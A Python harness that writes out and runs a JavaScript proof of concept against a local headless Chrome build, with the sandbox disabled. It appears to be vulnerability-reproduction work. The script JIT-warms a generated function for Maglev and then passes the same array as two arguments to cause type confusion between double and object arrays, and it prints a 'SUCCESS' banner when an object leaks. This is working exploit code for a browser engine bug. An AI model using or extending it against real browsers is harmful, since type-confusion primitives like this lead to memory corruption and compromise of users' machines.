import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
let dummy = { a: 1 };
let arr_obj = [dummy, 2.2, 3.3];
let arr_double = [1.1, 2.2, 3.3];

function create_and_warmup() {
  let lines = [];
  lines.push("function f0(x, v2, v3, obj) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  lines.push(`
    let a = v3[0];
    v2[0] = obj;
    return v3[1];
  `);
  lines.push("}");
  lines.push("return f0;");
  let fn = new Function(lines.join("\\n"))();
  
  for (let i = 0; i < 20000; i++) {
    fn(i, arr_obj, arr_double, dummy);
  }
  return fn;
}

async function main() {
  let fn = create_and_warmup();
  console.log("Warming up done. Sleeping 1500ms for Maglev...");
  await new Promise(r => setTimeout(r, 1500));
  
  console.log("Now executing compiled f0 with aliasing victim...");
  let victim = [1.1, 2.2, 3.3];
  let res = fn(1000, victim, victim, dummy);
  console.log("TEST RESULT: type=" + (typeof res) + " val=" + res);
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SUCCESS! Object:", res, "🔥🔥🔥");
  }
  window.close();
}
main();
</script></body></html>"""

with open("script/test_cve_wait.html", "w") as f:
    f.write(html)
profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/test_cve_wait.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()
for l in out.splitlines():
    if any(k in l for k in ["RESULT", "f0", "MAGLEV", "compil", "CONSOLE", "SUCCESS"]):
        print(l)
